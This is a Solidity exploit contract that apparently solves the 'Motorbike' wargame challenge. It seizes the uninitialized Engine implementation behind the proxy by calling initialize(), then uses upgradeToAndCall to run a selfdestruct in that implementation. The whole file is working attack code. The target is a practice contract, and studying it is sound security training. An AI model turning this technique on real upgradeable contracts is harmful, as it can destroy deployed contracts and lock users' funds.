// SPDX-License-Identifier: Unlicense
pragma experimental ABIEncoderV2;
pragma solidity <0.7.0;

import "../../src/Motorbike/Motorbike.sol";


import "../../exploits/BlockUtils.sol";

contract MaliciousContract {
    function killed() external {
        selfdestruct(address(0));
    }
}

contract MotorbikeExploit is BlockUtils {

    Motorbike motorbike;

    MaliciousContract malicious;

    constructor(address _victim) public {
        motorbike = Motorbike(payable(_victim));
        malicious = new MaliciousContract();
    }

    function hack() public {

        // Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
        Engine engineAddress = Engine(address(uint160(uint256(peekStorage(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

        engineAddress.initialize();
        console.log("Upgrader is :", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(address(malicious), encodedData);

    }

    receive() external payable {
    }
}